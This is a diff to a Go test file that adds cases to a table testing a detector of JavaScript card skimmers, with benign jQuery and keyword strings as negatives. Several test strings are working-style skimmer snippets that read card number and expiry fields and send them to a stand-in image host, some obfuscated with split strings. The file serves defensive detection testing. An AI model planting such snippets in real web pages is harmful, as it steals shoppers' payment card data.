@@ -67,6 +67,8 @@ func TestSkimmerSignals(t *testing.T) {
 		"after a class":          {`var g=class{}/2;var f=document.querySelector('[name="payment[cc'+'_number]"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
 		"after a labelled block": {"l:{}/'/;var f=document.querySelector('[name=\"payment[cc'+'_number]\"]');new Image().src=\"https://img.example.com/p?d=\"+f.value", true},
 		"after an arrow":         {"var g=()=>{}\n/'/;var f=document.querySelector('[name=\"payment[cc'+'_number]\"]');new Image().src=\"https://img.example.com/p?d=\"+f.value", true},
+		"sql grammar":            {`var kw="exec|expiredate|expiry_date|explicit";function ent(c){return "&#"+String(c)+(dh.test(String.fromCharCode(c))?"":";")};document.querySelectorAll("input")`, false},
+		"expiry beside a card":   {`var n=document.querySelector('[name="card_number"]').value,e=$('#expiry_date').val();new Image().src="https://img.example.com/p?d="+n+e`, true},
 		"jquery-ish":             {`jQuery.fn.extend({serialize:function(){return jQuery.param(this.serializeArray())},serializeArray:function(){return this.map(function(){var e=jQuery.prop(this,"elements");return e?jQuery.makeArray(e):this})}})`, false},
 	} {
 		if got := skimmerSignals([]byte(c.src)) != nil; got != c.want {
